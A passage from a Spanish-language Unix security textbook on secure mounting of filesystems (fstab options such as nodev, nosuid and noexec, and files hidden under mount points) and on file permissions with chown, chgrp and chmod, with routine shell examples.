en Linux&#x2026;), su funci&#x00F3;n &#x2013; e incluso su sintaxis &#x2013; es siempre equivalente. Un ejemplo de este &#xFB01;chero es el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/fstab
&#x00A0;/dev/hda3&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ext2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;defaults&#x00A0;&#x00A0;&#x00A0;1&#x00A0;&#x00A0;&#x00A0;1
&#x00A0;/dev/hda4&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/home&#x00A0;&#x00A0;&#x00A0;&#x00A0;ext2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;defaults&#x00A0;&#x00A0;&#x00A0;1&#x00A0;&#x00A0;&#x00A0;2
&#x00A0;none&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/proc&#x00A0;&#x00A0;&#x00A0;&#x00A0;proc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;defaults&#x00A0;&#x00A0;&#x00A0;1&#x00A0;&#x00A0;&#x00A0;1
&#x00A0;luisa:~#
</literallayout>
<!--l. 87--><para>Cuando el sistema arranque, el &#xFB01;chero anterior viene a indicar que en /dev/hda3 se encuentra el sistema de
&#xFB01;cheros ra&#x02CA;&#x0131;z, de tipo ext2 (el habitual en Linux), y que se ha de montar con las opciones que se toman por
defecto. La segunda l&#x02CA;&#x0131;nea nos dice que /home es un sistema diferente del anterior, pero del mismo tipo y
que se montar&#x00E1; con las mismas opciones; &#xFB01;nalmente, la &#x00FA;ltima entrada hace referencia al directorio /proc/,
donde se encuentra un sistema de &#xFB01;cheros especial que algunos Unices utilizan como interfaz entre
estructuras de datos del n&#x00FA;cleo y el espacio de usuario (no entraremos en detalles con &#x00E9;l). Si cualquiera de las
entradas anteriores fuera err&#x00F3;nea, el sistema o bien no arrancar&#x02CA;&#x0131;a o bien lo har&#x02CA;&#x0131;a incorrectamente. Por lo
que evidentemente el &#xFB01;chero /etc/fstab o sus equivalentes ha de ser s&#x00F3;lo modi&#xFB01;cable por el root,
aunque nos puede interesar &#x2013; como veremos luego &#x2013; que los usuarios sin privilegios puedan
leerlo.
<!--br/-->
<!--br/-->Lo visto hasta aqu&#x02CA;&#x0131; no suele representar ning&#x00FA;n problema de seguridad en Unix; si hemos dicho que no
hablar&#x02CA;&#x0131;amos de aspectos generales de los sistemas de &#xFB01;cheros, &#x00BF;por qu&#x00E9; comentamos este aspecto? Muy
sencillo: diferentes problemas radican en una gesti&#x00F3;n incorrecta del montaje de sistemas de &#xFB01;cheros. Por
ejemplo, algo muy habitual en un atacante que consigue privilegios de administrador en una m&#x00E1;quina es
instalar ciertas utilidades que le permitan seguir gozando de ese privilegio (por ejemplo, un rootkit o un
simple shell setuidado); si guarda el &#xFB01;chero setuidado &#x2013; hablaremos m&#x00E1;s tarde de estos permisos
&#x2018;especiales&#x2019; &#x2013; en cualquier directorio de nuestro sistema, su localizaci&#x00F3;n ser&#x00E1; muy r&#x00E1;pida: una
orden tan simple como find nos alertar&#x00E1; de su presencia. En cambio, &#x00BF;qu&#x00E9; sucede si el atacante
utiliza una parte del sistema de &#xFB01;cheros oculta? Cuando montamos un sistema bajo un nombre
de directorio, todo lo que hab&#x02CA;&#x0131;a en ese directorio desaparece de la vista, y es sustituido por
el contenido del sistema montado; no volver&#x00E1; a estar accesible hasta que no desmontemos el
sistema:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;mount
&#x00A0;/dev/hda3&#x00A0;on&#x00A0;/&#x00A0;type&#x00A0;ext2&#x00A0;(rw)
&#x00A0;/dev/hda4&#x00A0;on&#x00A0;/home&#x00A0;type&#x00A0;ext2&#x00A0;(rw)
&#x00A0;none&#x00A0;on&#x00A0;/proc&#x00A0;type&#x00A0;proc&#x00A0;(rw)
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;/home/
&#x00A0;ftp/&#x00A0;&#x00A0;&#x00A0;toni/&#x00A0;&#x00A0;&#x00A0;&#x00A0;lost+found/
&#x00A0;luisa:~#&#x00A0;umount&#x00A0;/home
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;/home/
&#x00A0;luisa:~#
</literallayout>
<!--l. 130--><para>El atacante puede desmontar una parte de nuestra jerarqu&#x02CA;&#x0131;a de directorios, guardar ah&#x02CA;&#x0131; ciertos &#xFB01;cheros, y
volver a montar el sistema que hab&#x02CA;&#x0131;a anteriormente; localizar esos archivos puede ser complicado, no por
motivos t&#x00E9;cnicos sino porque a muy poca gente se le ocurre hacerlo. La orden ncheck, existente en Unices
antiguos, puede detectar estos &#xFB01;cheros ocultos bajo un mount point; si no disponemos de esta utilidad
podemos buscar por Internet aplicaciones que consiguen lo mismo, o simplemente desmontar
manualmente los sistemas (a excepci&#x00F3;n del ra&#x02CA;&#x0131;z) y comprobar que no hay nada oculto bajo
ellos.
<!--br/-->
<!--br/-->El tema de desmontar sistemas de &#xFB01;cheros tambi&#x00E9;n puede ocasionar alg&#x00FA;n dolor de cabeza a muchos
administradores; aunque no se trata de algo estrictamente relativo a la seguridad, vamos a comentar un
problema t&#x02CA;&#x0131;pico que se podr&#x02CA;&#x0131;a considerar incluso una negaci&#x00F3;n de servicio (no causada por un fallo de Unix
sino por el desconocimiento del administrador). En ocasiones, al intentar desmontar un sistema de
&#xFB01;cheros, encontramos el siguiente resultado:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;umount&#x00A0;/home/
&#x00A0;umount:&#x00A0;/home:&#x00A0;device&#x00A0;is&#x00A0;busy
&#x00A0;luisa:~#
</literallayout>
<!--l. 153--><para>&#x00BF;Qu&#x00E9; sucede? Simplemente que existe un determinado proceso haciendo uso de recursos bajo ese nombre de
directorio. Hasta que dicho proceso no &#xFB01;nalice (por las buenas o por las malas), ser&#x00E1; imposible desmontar el
sistema; es f&#x00E1;cil determinar de qu&#x00E9; proceso se trata &#x2013; y posteriormente eliminarlo &#x2013; mediante la orden
fuser.
<!--br/-->
<!--br/-->Otro problema cl&#x00E1;sico de los sistemas de &#xFB01;cheros viene de la necesidad que en muchos entornos existe de
permitir a los usuarios &#x2013; sin privilegios &#x2013; montar y desmontar sistemas de &#xFB01;cheros (t&#x02CA;&#x0131;picamente, discos
&#xFB02;exibles o CD-ROMs). Por ejemplo, imaginemos un laboratorio de m&#x00E1;quinas Unix donde es deseable que
todos los usuarios puedan acceder a la disquetera, tanto para copiar pr&#x00E1;cticas realizadas en casa
como para hacer una copia de las que se han hecho en el propio laboratorio (este es uno de
los casos m&#x00E1;s frecuentes en cualquier organizaci&#x00F3;n). Unix permite dar una soluci&#x00F3;n r&#x00E1;pida a este
problema, pero esta soluci&#x00F3;n puede convertirse en una amenaza a la seguridad si no es implantada
correctamente:
<!--br/-->
<!--br/-->Al hablar de /etc/fstab hemos comentado el montaje con ciertas opciones tomadas por defecto; dichas
opciones son &#x2013; en el caso de Linux, consultar la p&#x00E1;gina del manual de mount en otros sistemas &#x2013; &#x2018;rw&#x2019; (se
permite tanto la lectura como la escritura), &#x2018;suid&#x2019; (se permite la existencia de &#xFB01;cheros setuidados), &#x2018;dev&#x2019;
(se permite la existencia de dispositivos), &#x2018;exec&#x2019; (se permite la ejecuci&#x00F3;n de binarios), &#x2018;auto&#x2019; (el sistema
se monta autom&#x00E1;ticamente al arrancar o al utilizar mount -a), &#x2018;nouser&#x2019; (s&#x00F3;lo puede ser montado
por el root) y &#x2018;async&#x2019; (la entrada/salida sobre el dispositivo se realiza de forma as&#x02CA;&#x0131;ncrona).
Evidentemente, se trata de las opciones m&#x00E1;s l&#x00F3;gicas para sistemas de &#xFB01;cheros &#x2018;normales&#x2019;, pero no
para los que puedan montar los usuarios; si deseamos que un usuario sin privilegios pueda
montar y desmontar cierto dispositivo, hemos de especi&#xFB01;car la opci&#x00F3;n &#x2018;user&#x2019; en la entrada
correspondiente de /etc/fstab. Parece l&#x00F3;gico tambi&#x00E9;n utilizar &#x2018;noauto&#x2019; para que el sistema no se monte
autom&#x00E1;ticamente en el arranque de la m&#x00E1;quina (si esto sucediera, el root tendr&#x02CA;&#x0131;a que desmontar la unidad
manualmente para que otros usuarios puedan montarla), pero otras opciones importantes no
son tan inmediatas. Es imprescindible que si permitimos a un usuario montar una unidad
utilicemos &#x2018;nodev&#x2019;, de forma que si en el sistema montado existen &#xFB01;cheros de tipo dispositivo (por
ejemplo, un archivo que haga referencia a nuestros discos duros) ese &#xFB01;chero sea ignorado; en
caso contrario, cualquiera podr&#x02CA;&#x0131;a acceder directamente a nuestro hardware, por ejemplo para
destruir completamente los discos duros o bloquear toda la m&#x00E1;quina. Tambi&#x00E9;n es importante
especi&#xFB01;car &#x2018;nosuid&#x2019;, de forma que se ignore el bit de setuid en cualquier &#xFB01;chero contenido en el
sistema que el usuario monta: as&#x02CA;&#x0131; evitamos que con un simple shell setuidado en un disco
&#xFB02;exible el usuario consiga privilegios de administrador en nuestro sistema. Incluso puede ser
conveniente especi&#xFB01;car &#x2018;noexec&#x2019;, de forma que no se pueda ejecutar nada de lo que est&#x00E1; en el
dispositivo montado &#x2013; esto parece l&#x00F3;gico, ya que en principio se va a tratar de una unidad utilizada
simplemente para transferir datos entre la m&#x00E1;quina y un sistema externo a la red, como el
ordenador de casa de un alumno &#x2013;. Todas estas opciones (&#x2018;noexec&#x2019;, &#x2018;nosuid&#x2019; y &#x2018;nodev&#x2019;)
en Linux se asumen simplemente al indicar &#x2018;user&#x2019;, pero en otros sistemas Unix quiz&#x00E1;s no,
por lo que nunca est&#x00E1; de m&#x00E1;s ponerlas expl&#x02CA;&#x0131;citamente (o al menos consultar el manual en otros
clones de Unix para asegurarse del efecto de cada opci&#x00F3;n); de esta forma, si queremos que los
usuarios puedan montar por ejemplo la disquetera, una entrada correcta en /etc/fstab ser&#x02CA;&#x0131;a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;grep&#x00A0;fd0&#x00A0;/etc/fstab
&#x00A0;/dev/fd0&#x00A0;&#x00A0;&#x00A0;&#x00A0;/floppy&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ext2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;user,noauto,nodev,nosuid,noexec
&#x00A0;luisa:~#
</literallayout>
<!--l. 214--><para>Otro aspecto relacionado con el montaje de sistemas de &#xFB01;cheros que puede afectar a nuestra
seguridad es el uso de sistemas de &#xFB01;cheros diferentes del ra&#x02CA;&#x0131;z bajo ciertos directorios; una elecci&#x00F3;n
incorrecta a la hora de elegir d&#x00F3;nde montar sistemas puede causar ciertos problemas, sobre todo
negaciones de servicio. Generalmente, es recomendable montar dispositivos diferentes bajo
todos y cada uno de los directorios sobre los que los usuarios tienen permiso de escritura;
esto incluye el padre de sus $HOME, /tmp/ o /var/tmp/ (que puede ser un simple enlace a
/tmp/). Con esto conseguimos que si un usuario llena un disco, esto no afecte al resto del
sistema: un disco lleno implica muchos problemas para la m&#x00E1;quina, desde correo electr&#x00F3;nico que
no se recibe, logs que no se registran, o simplemente una negaci&#x00F3;n de servicio contra el resto
de usuarios, que no podr&#x00E1;n almacenar nada. Aunque algunos Unices reservan una parte de
cada disco o partici&#x00F3;n para escritura s&#x00F3;lo del root o de procesos que corran bajo el UID 0 &#x2013;
t&#x02CA;&#x0131;picamente un 10 % de su capacidad total &#x2013;, no podemos con&#xFB01;ar ciegamente en este mecanismo
para mantener segura nuestra m&#x00E1;quina; as&#x02CA;&#x0131;, una con&#xFB01;guraci&#x00F3;n m&#x00E1;s o menos adecuada ser&#x02CA;&#x0131;a la
siguiente <anchor 
   id="x1-54001f2"  ></anchor><footnote><para>     Recordemos que en ciertos Unices existe /var/tmp/, directorio donde los usuarios tambi&#x00E9;n pueden escribir; quiz&#x00E1;s nos
interese, en lugar de dedicar una partici&#x00F3;n a este directorio, enlazarlo simb&#x00F3;licamente a /tmp/.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;mount
&#x00A0;/dev/hda1&#x00A0;on&#x00A0;/&#x00A0;type&#x00A0;ext2&#x00A0;(rw)
&#x00A0;/dev/hda2&#x00A0;on&#x00A0;/tmp&#x00A0;type&#x00A0;ext2&#x00A0;(rw)
&#x00A0;/dev/hdb1&#x00A0;on&#x00A0;/home&#x00A0;type&#x00A0;ext2&#x00A0;(rw)
&#x00A0;none&#x00A0;on&#x00A0;/proc&#x00A0;type&#x00A0;proc&#x00A0;(rw)
&#x00A0;rosita:~#
</literallayout>
<!--l. 245--><para>Como podemos comprobar, si un usuario lanza un ftp en background desde su $HOME durante la noche
&#x2013; t&#x02CA;&#x0131;pico proceso que llena gran cantidad de disco &#x2013;, en todo caso podr&#x00E1; afectar al resto de
usuarios, pero nunca al sistema en global (correo, logs, root&#x2026;); este tipo de problemas no
suelen ser ataques, sino m&#x00E1;s bien descuidos de los usuarios que no tienen en cuenta el espacio
disponible antes de descargar &#xFB01;cheros de forma no interactiva. Si queremos que ni siquiera pueda
afectar al resto de usuarios, podemos establecer un sistema de quotas de disco en nuestra
m&#x00E1;quina.
  </para></section><!--end section--><!--l. 254--><section 
role="section"><title><abbrev role="title-mark">4.3</abbrev><anchor 
   id="x1-550004.3"  ></anchor>Permisos de un archivo</title>
<!--l. 255--><para>  Los permisos de cada &#xFB01;chero son la protecci&#x00F3;n m&#x00E1;s b&#x00E1;sica de estos objetos del sistema operativo; de&#xFB01;nen
qui&#x00E9;n puede acceder a cada uno de ellos, y de qu&#x00E9; forma puede hacerlo. Cuando hacemos un listado largo de
ciertos archivos podemos ver sus permisos junto al tipo de &#xFB01;chero correspondiente, en la primera columna
de cada l&#x02CA;&#x0131;nea:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/sbin/rc0
&#x00A0;-rwxr--r--&#x00A0;&#x00A0;&#x00A0;3&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;sys&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2689&#x00A0;Dec&#x00A0;&#x00A0;1&#x00A0;&#x00A0;1998&#x00A0;/sbin/rc0
&#x00A0;anita:~#
</literallayout>
<!--l. 269--><para>En este caso vemos que el archivo listado es un &#xFB01;chero plano (el primer car&#x00E1;cter es un &#x2018;-&#x2019;) y sus permisos son
&#x2018;rwxr--r--&#x2019;. &#x00BF;C&#x00F3;mo interpretar estos caracteres? Los permisos se dividen en tres ternas en funci&#x00F3;n de a qu&#x00E9;
usuarios afectan; cada una de ellas indica la existencia o la ausencia de permiso para leer, escribir o
ejecutar el &#xFB01;chero: una r indica un permiso de lectura, una w de escritura, una x de ejecuci&#x00F3;n y
un &#x2018;-&#x2019; indica que el permiso correspondiente no est&#x00E1; activado. As&#x02CA;&#x0131;, si en una de las ternas
tenemos los caracteres rwx, el usuario o usuarios afectados por esa terna tiene o tienen permisos
para realizar cualquier operaci&#x00F3;n sobre el &#xFB01;chero. &#x00BF;De qu&#x00E9; usuarios se trata en cada caso? La
primera terna afecta al propietario del &#xFB01;chero, la segunda al grupo del propietario cuando lo cre&#x00F3;
(recordemos un mismo usuario puede pertenecer a varios grupos) y la tercera al resto de usuarios.
De esta forma, volviendo al ejemplo anterior, tenemos los permisos mostrados en la &#xFB01;gura
<ulink 
  url="#x1-550011"  ><!--ref: perm--></ulink>.
<!--br/--></para><figure><title/><blockquote> ______________________ 
                  ______________________ 
                                   ______________________ 
                                          __________-
                         ____________________-
        ____________________-r w xr - -         r - -
                                              Miembros del grupo (sys): lectura.
                            Propietario (root): lectura, escritura y ejecuci&#x00F3;n.Resto de usuarios: lectura.
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-550011"  ></anchor>Figura&#x00A0;4.1</title><para>Permisos de un &#xFB01;chero</para></blockquote>
  </blockquote></figure>
<!--br/-->Cuando un usuario <anchor 
   id="x1-55002f3"  ></anchor><footnote><para>     Excepto el root, que no se ve afectado por los permisos de un &#xFB01;chero.</para></footnote>
intenta acceder en alg&#x00FA;n modo a un archivo, el sistema comprueba qu&#x00E9; terna de permisos es la aplicable y se
basa &#x00FA;nicamente en ella para conceder o denegar el acceso; as&#x02CA;&#x0131;, si un usuario es el propietario del &#xFB01;chero s&#x00F3;lo
se comprueban permisos de la primera terna; si no, se pasa a la segunda y se aplica en caso de que los
grupos coincidan, y de no ser as&#x02CA;&#x0131; se aplican los permisos de la &#x00FA;ltima terna. De esta forma es posible tener
situaciones tan curiosas como la de un usuario que no tenga ning&#x00FA;n permiso sobre uno de sus archivos, y en
cambio que el resto de usuarios del sistema pueda leerlo, ejecutarlo o incluso borrarlo; obviamente, esto
no es lo habitual, y de suceder el propietario siempre podr&#x00E1; restaurar los permisos a un valor
adecuado.
<!--br/-->
<!--br/-->El propietario y el grupo de un &#xFB01;chero se pueden modi&#xFB01;car con las &#x00F3;rdenes chown y chgrp respectivamente;
ambas reciben como par&#x00E1;metros al menos el nombre de usuario o grupo (los nombres v&#x00E1;lidos de usuario
son los que poseen una entrada en /etc/passwd mientras que los grupos v&#x00E1;lidos se leen de
/etc/group) al que vamos a otorgar la posesi&#x00F3;n del &#xFB01;chero, as&#x02CA;&#x0131; como el nombre de archivo a
modi&#xFB01;car:

     <literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chown&#x00A0;toni&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chgrp&#x00A0;staff&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;staff&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#
</literallayout>
<!--l. 347--><para>En muchas variantes de Unix es posible cambiar a la vez el propietario y el grupo de un &#xFB01;chero mediante
chown, separando ambos mediante un car&#x00E1;cter especial, generalmente &#x2018;:&#x2019; o &#x2018;.&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chown&#x00A0;toni:staff&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;staff&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#
</literallayout>
<!--l. 360--><para>Como vemos, ninguna de estas &#x00F3;rdenes altera el campo de
permisos <anchor 
   id="x1-55003f4"  ></anchor><footnote><para>     Esto no siempre es as&#x02CA;&#x0131;: bajo ciertas circunstancias en algunos Unix el cambio de grupo o de propietario puede modi&#xFB01;car
los permisos del archivo, como veremos al hablar de &#xFB01;cheros setuidados.</para></footnote>;
para modi&#xFB01;car los permisos de un archivo se utiliza la orden chmod. Este comando generalmente recibe
como par&#x00E1;metro el permiso en octal que queremos asignar a cierto &#xFB01;chero, as&#x02CA;&#x0131; como el nombre del
mismo:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;staff&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;755&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rwxr-xr-x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;staff&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero
&#x00A0;anita:~#
</literallayout>
<!--l. 377--><para>&#x00BF;C&#x00F3;mo podemos obtener el n&#x00FA;mero en octal a partir de una terna de permisos determinada, y viceversa?
Evidentemente no podemos entrar aqu&#x02CA;&#x0131; a tratar todas las caracter&#x02CA;&#x0131;sticas de este sistema de numeraci&#x00F3;n,
pero vamos a proporcionar unas ideas b&#x00E1;sicas. Imaginemos que tenemos un &#xFB01;chero con unos determinados
permisos de los que queremos calcular su equivalente octal, o que conocemos los permisos a asignar pero
no su equivalente num&#x00E9;rico; por ejemplo, necesitamos asignar a un &#xFB01;chero la terna rw-r---wx, que en la
pr&#x00E1;ctica no tiene mucho sentido pero que a nosotros nos sirve de ejemplo. Lo primero que debemos hacer
a partir de estos bits rwx es calcular su equivalente binario, para lo que asignamos el valor
&#x2018;1&#x2019; si un determinado permiso est&#x00E1; activo (es decir, si aparece una r, w o x en &#x00E9;l) y un &#x2018;0&#x2019; si
no lo est&#x00E1; (aparece un &#x2018;-&#x2019;); as&#x02CA;&#x0131;, el equivalente binario de la terna propuesta es 110100011.
Ahora simplemente hemos de pasar el n&#x00FA;mero del sistema binario al octal: lo dividimos en
grupos de tres elementos (110 100 011) y de cada uno de ellos calculamos su equivalente
octal:
     </para><!--l. 394--><para><informalequation><graphic 
fileref="unixsec34x.gif"></graphic></informalequation>
     <!--br/--><informalequation><graphic 
fileref="unixsec35x.gif"></graphic></informalequation>
     <!--br/--><informalequation><graphic 
fileref="unixsec36x.gif"></graphic></informalequation>
</para><!--l. 398--><para>Ya tenemos los tres n&#x00FA;meros de nuestra terna de permisos, o lo que es lo mismo, la representaci&#x00F3;n octal de los
bits iniciales: 643. Por tanto, si necesitamos asignar esta terna a un cierto &#xFB01;chero, simplemente hemos de
ejecutar la orden chmod indic&#x00E1;ndole este n&#x00FA;mero y el nombre del archivo:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;643&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rw-r---wx&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;799&#x00A0;Feb&#x00A0;&#x00A0;8&#x00A0;19:47&#x00A0;/tmp/fichero*
&#x00A0;anita:~#
</literallayout>
<!--l. 411--><para>La forma de trabajar de chmod comentada requiere que se indique expl&#x02CA;&#x0131;citamente el valor octal de los bits
rwx que queremos otorgar a un &#xFB01;chero; sin importar el valor de las ternas que pose&#x02CA;&#x0131;a antes de ejecutar
la orden, estamos asignando a los permisos del archivo el nuevo valor valor indicado en la
l&#x02CA;&#x0131;nea de comandos. Existe otra forma de trabajo de chmod denominada &#x2018;simb&#x00F3;lica&#x2019; en la que no
necesitamos indicar el valor octal de todos los bits, sino que especi&#xFB01;camos &#x00FA;nicamente par&#x00E1;metros para
los valores de los permisos que el archivo posee y deseamos modi&#xFB01;car. En lugar de utilizar
el equivalente octal, utilizamos s&#x02CA;&#x0131;mbolos (de ah&#x02CA;&#x0131; el nombre de esta forma de trabajo) que
representan la activaci&#x00F3;n o desactivaci&#x00F3;n de ciertos bits en cada una de las tres ternas; la sintaxis
b&#x00E1;sica <anchor 
   id="x1-55004f5"  ></anchor><footnote><para>     Se recomienda consultar la p&#x00E1;gina del manual para ver otras opciones de la orden.</para></footnote> de
chmod en este caso es la siguiente:
</para><section role="center"><title/>
<!--l. 425--><para> chmod <informalequation><graphic 
fileref="unixsec38x.gif"></graphic></informalequation>ugoa<informalequation><graphic 
fileref="unixsec39x.gif"></graphic></informalequation>{+,-}{rwxst} &#xFB01;chero</para></section>
<!--l. 429--><para>Podemos ver que el valor simb&#x00F3;lico comienza por cero o m&#x00E1;s letras que indican sobre que terna de los permisos
se van a realizar los cambios (u para propietario del &#xFB01;chero, g para grupo, o para resto de usuarios y a
para las tres ternas; si no se especi&#xFB01;ca ninguna letra, se asume a). A ellas les sigue un signo &#x2018;+&#x2019; o &#x2018;-&#x2019; en
funci&#x00F3;n de si deseamos activar o resetar el bit sobre el que trabajamos, par&#x00E1;metro indicado por el
&#x00FA;ltimo conjunto formado por una o m&#x00E1;s letras, r para el permiso de lectura, w para escritura, x
para ejecuci&#x00F3;n, s para SUID o SGID y t para bit de permanencia (el signi&#xFB01;cado de estos dos
&#x00FA;ltimos se explicar&#x00E1; en el punto siguiente). Entre los tres campos del valor simb&#x00F3;lico no se insertan
espacios:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-r--------&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;902&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;05:05&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;+x&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-r-x--x--x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;902&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;05:05&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;og-x&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-r-x------&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;902&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;05:05&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;ug+rwx&#x00A0;/tmp/fichero
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rwxrwx---&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;902&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;05:05&#x00A0;/tmp/fichero
&#x00A0;anita:~#
</literallayout>
